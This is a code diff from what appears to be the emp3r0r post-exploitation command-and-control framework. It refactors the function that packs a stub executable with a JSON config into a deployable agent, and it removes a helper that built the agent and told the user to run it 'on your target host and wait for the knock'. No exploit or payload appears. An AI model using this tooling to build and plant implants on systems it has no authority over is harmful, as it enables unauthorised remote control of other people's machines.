@@ -3,7 +3,6 @@ package cc
 import (
 	"fmt"
 	"io/ioutil"
-	"os"
 	"strconv"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
@@ -12,16 +11,16 @@ import (
 )
 
 func GenAgent() {
-	buildJSONFile := "./emp3r0r.json"
-	stubFile := "./stub.exe"
-	outfile := "./emp3r0r_data.exe"
+	buildJSONFile := EmpRoot + "/emp3r0r.json"
+	stubFile := EmpRoot + "/stub.exe"
+	outfile := EmpRoot + "/emp3r0r_data.exe"
 	CliPrintWarning("Make sure %s and %s exist, and %s must NOT be packed",
 		buildJSONFile, stubFile, strconv.Quote(stubFile))
 
 	// read file
 	jsonBytes, err := ioutil.ReadFile(buildJSONFile)
 	if err != nil {
-		CliPrintError("%v", err)
+		CliPrintError("Parsing emp3r0r JSON config file: %v", err)
 		return
 	}
 
@@ -36,7 +35,7 @@ func GenAgent() {
 	// write
 	toWrite, err := ioutil.ReadFile(stubFile)
 	if err != nil {
-		CliPrintError("%v", err)
+		CliPrintError("Read stub: %v", err)
 		return
 	}
 	toWrite = append(toWrite, []byte(RuntimeConfig.MagicString)...)
@@ -50,18 +49,6 @@ func GenAgent() {
 	// done
 	CliPrintSuccess("Generated %s from %s and %s, you can run %s on arbitrary target",
 		outfile, stubFile, buildJSONFile, outfile)
-}
-
-// BuildAgent invoke build.py and guide user to build agent binary
-func BuildAgent() {
-	os.Chdir("..")
-	defer os.Chdir("build")
-	err := TmuxNewWindow("build-agent", "./build.py --target agent")
-	if err != nil {
-		CliPrintError("Something went wrong, please check `build.py` output")
-		return
-	}
-	CliPrintInfo("Run ./build/agentXXX on your target host and wait for the knock")
 }
 
 func UpgradeAgent() {
